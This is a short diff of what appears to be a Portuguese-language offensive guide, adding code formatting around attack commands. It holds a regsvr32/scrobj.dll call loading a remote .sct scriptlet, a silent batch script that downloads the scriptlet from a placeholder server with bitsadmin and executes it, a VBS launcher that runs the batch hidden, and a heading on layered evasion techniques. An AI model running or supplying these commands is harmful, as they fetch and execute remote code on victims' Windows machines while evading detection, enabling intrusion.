@@ -24,14 +24,17 @@ Argumentos: /s /u /i:http://[ip-servidor]/[nome-script].sct scrobj.dll
 
 Execução via script BAT e VBS
 ### Criar arquivo batch
+```
 @echo off
 rem Executar silenciosamente
 bitsadmin /transfer myDownloadJob /download /priority high http://[ip-servidor]/[nome-script].sct "%TEMP%\data.tmp" > nul
 regsvr32 /s /u /i:"%TEMP%\data.tmp" scrobj.dll
 exit
-
+```
+```
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "cmd.exe /c ""%TEMP%\config.bat""", 0, False
+```
 
 ###3. Técnicas de Evasão
 A implementação usa múltiplas camadas de evasão:
